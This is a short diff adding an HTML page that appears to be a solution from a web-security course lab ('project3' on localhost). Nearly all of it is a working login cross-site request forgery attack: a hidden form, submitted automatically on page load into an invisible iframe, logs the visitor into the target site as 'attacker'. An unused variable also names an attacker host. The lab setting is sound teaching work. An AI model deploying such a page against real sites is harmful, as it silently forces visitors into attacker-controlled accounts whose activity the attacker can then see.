@@ -1,0 +1,31 @@
+<meta charset="utf-8">
+
+
+
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js%22%3E</script>
+<script>
+
+var xssdefense = 3;
+var target = "http://localhost:34443/project3/";
+var attacker = "http://127.0.0.1:11380/";
+
+
+</script>
+
+
+
+<iframe name="badFrame" height="0" width="0"></iframe>
+
+<form id="loginForm" action="http://localhost:34443/project3/login?csrfdefense=0&xssdefense=4" method="POST" target="badFrame">
+    <input type="hidden" name="username" value="attacker" />
+    <input type="hidden" name="password" value="123456" />
+
+</form>
+
+
+<script>
+
+document.forms[0].submit();
+
+
+</script>
